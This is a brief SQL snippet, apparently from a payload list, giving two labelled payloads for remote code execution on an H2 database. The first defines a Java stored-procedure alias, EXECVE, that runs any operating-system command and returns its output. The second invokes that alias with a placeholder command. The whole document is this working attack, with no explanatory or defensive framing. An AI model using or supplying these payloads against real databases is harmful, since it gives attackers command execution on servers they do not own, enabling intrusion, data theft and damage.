-- Payload 1: Create the EXECVE alias (H2 Java stored procedure for RCE)
CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;

-- Payload 2: Execute a command via the alias
CALL EXECVE('<cmd>');
